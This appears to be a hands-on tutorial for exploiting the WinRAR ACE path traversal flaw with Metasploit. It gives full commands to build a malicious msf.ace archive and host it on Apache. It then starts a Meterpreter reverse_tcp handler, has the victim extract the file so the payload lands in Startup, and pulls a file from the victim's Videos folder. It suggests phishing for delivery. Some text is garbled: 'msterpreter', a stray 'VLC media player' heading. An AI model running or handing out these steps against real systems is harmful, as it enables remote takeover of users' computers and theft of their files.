# Exploitation using Winrar with ace file

We'll using the Winrar to gain access to your computer. In WinRAR versions prior to and including 5.61, there is a path traversal vulnerability when crafting the filename field of the ACE format (in UNACEV2.dll). When the filename field is manipulated with specific patterns, the destination (extraction) folder is ignored, thus treating the filename as an absolute path. This module will attempt to extract a payload to the startup folder of the current user. It is limited such that we can only go back one folder.

## Tutorial Video

![Exe Attack](./images/exe_attack.png)

## Steps for exploiting using the VLC media player

### Step 1: Generating the exploited ace file

On our attacking system, we'll be creating **msf.ace** files using MSFconsole.

```bash
$ msfconsole
msf5 > use exploit/windows/fileformat/winrar_ace
msf5 exploit(windows/fileformat/winrar_ace)> set LHOST 192.168.1.26
msf5 exploit(windows/fileformat/winrar_ace)> set LPORT 443
msf5 exploit(windows/fileformat/winrar_ace)> exploit
msf5 exploit(windows/fileformat/winrar_ace)> exit
```

### Step 2: Serving ace with apache server

We'll use an HTTP server to host our file, so all the victim has to do is connect to us, download the file, and run it. In the real world, this could be accomplished in any number of ways, including social engineering or a phishing attack. For now, though, we will keep it simple. First, we'll copy executable to `/var/www/html` than we'll start our apache server.

```bash
$ cp msf.ace /var/www/html/msf.ace
$ service apache2 start
```

### Step 3: Starting a Meterpreter handler

On our attacking system, we'll now create a handler to accept incoming connections from our payload. We should ensure the IP and port are the same as used in previous steps:

```bash
$ service postgresql start
$ msfconsole
msf5 > use multi/handler
msf5 exploit(multi/handler)> set PAYLOAD windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler)> set LHOST 192.168.1.26
msf5 exploit(multi/handler)> set LPORT 443
msf5 exploit(multi/handler)> exploit
```

So we have the reverse TCP handler listening on port 443 for any incoming connections. Now we just need to get the files we generated earlier onto the Windows 7 machine.

### Step 4: Downloading file on a victim's computer

On the target, browse to the URL(`/msf.ace`) with the IP address of the attacking machine and download the file.

`http://192.168.1.26/msf.ace`

Then, simply save it and extract it. Now after user restart it's computer we'll have a reverse connection to the Windows 7 machine from the Kali Linux command line.

### Step 5: Privilege Escalation

We have a Meterpreter session established back on our handler. So letâ€™s see what we can do with full control.

```bash
msterpreter> help
```

Now we'll download the video file from the videos folder as proof.

```bash
msterpreter> cd ..
msterpreter> cd Videos
msterpreter> download ./Wildlife.wmv
```

The file will be downloaded to the home folder we can further play it.

### References

- `https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/fileformat/winrar_ace.md`
- `https://www.youtube.com/watch?v=STZ3aZDR2uc`